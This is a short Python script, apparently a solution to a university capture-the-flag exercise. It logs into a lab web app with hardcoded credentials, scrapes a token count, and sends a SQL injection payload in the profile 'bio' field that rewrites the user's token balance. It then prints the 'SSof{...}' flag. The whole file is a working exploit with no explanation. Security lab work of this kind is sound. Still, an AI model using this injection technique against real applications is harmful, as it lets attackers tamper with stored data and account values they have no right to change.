import requests
import re

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22261"

s = requests.Session()

data = { "username" : "goncalo" , "password" : "ssof"}
s.post(link + "/login", data = data)
tokens = re.search(r'\d+', re.search(r'JACKPOT at \d+ tokens', s.get(link + "/profile").text).group(0)).group(0)
data = { "age" : "", "bio" : "', tokens = " + tokens + ", bio = '" }
print(re.search('SSof{.*}', s.post(link + "/update_profile", data = data).text).group(0))